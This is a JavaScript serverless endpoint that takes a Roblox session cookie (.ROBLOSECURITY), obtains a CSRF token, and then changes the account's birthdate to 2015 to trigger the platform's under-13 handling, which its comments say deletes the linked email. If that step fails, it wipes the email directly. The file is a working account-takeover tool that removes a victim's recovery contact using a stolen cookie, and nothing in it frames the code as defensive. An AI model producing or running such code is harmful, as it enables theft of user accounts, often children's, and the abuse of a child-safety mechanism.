export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    // 1. CSRF LOOP (Your friend's exact method)
    const csrfEndpoints = [
        { url: 'https://auth.roblox.com/v2/logout', method: 'POST' },
        { url: 'https://accountsettings.roblox.com/v1/email', method: 'POST' },
        { url: 'https://auth.roblox.com/v1/account/pin', method: 'GET' },
        { url: 'https://users.roblox.com/v1/users/authenticated', method: 'GET' }
    ];

    let csrfToken = '';
    for (const ep of csrfEndpoints) {
        try {
            const r = await fetch(ep.url, { method: ep.method, headers, body: ep.method === 'POST' ? JSON.stringify({}) : null });
            const token = r.headers.get('x-csrf-token');
            if (token) { csrfToken = token; break; }
        } catch (e) { continue; }
    }

    if (!csrfToken) {
        return res.status(401).json({ success: false, message: 'Cookie is dead. Could not fetch CSRF.' });
    }
    headers['X-CSRF-TOKEN'] = csrfToken;

    let messages = [];

    try {
        // 2. FORCE AGE TO UNDER 13 (Year 2015)
        // This triggers Roblox's COPPA compliance which automatically deletes the email.
        const ageRes = await fetch('https://users.roblox.com/v1/birthdate', {
            method: 'POST',
            headers,
            body: JSON.stringify({ birthMonth: 1, birthDay: 1, birthYear: 2015 })
        });

        if (ageRes.status === 200) {
            messages.push("Age forced to under 13. Email should now be deleted.");
        } else {
            // If age force fails, try to wipe directly as a fallback
            const wipeRes = await fetch('https://accountsettings.roblox.com/v1/email', {
                method: 'POST',
                headers,
                body: JSON.stringify({ emailAddress: "" })
            });
            if (wipeRes.status === 200) {
                messages.push("Email wiped directly.");
            } else {
                messages.push(`Age force failed: ${ageRes.status}. Wipe failed: ${wipeRes.status}.`);
            }
        }

        return res.status(200).json({ success: true, data: { messages } });

    } catch (error) {
        return res.status(500).json({ success: false, message: `Network Error: ${error.message}` });
    }
}
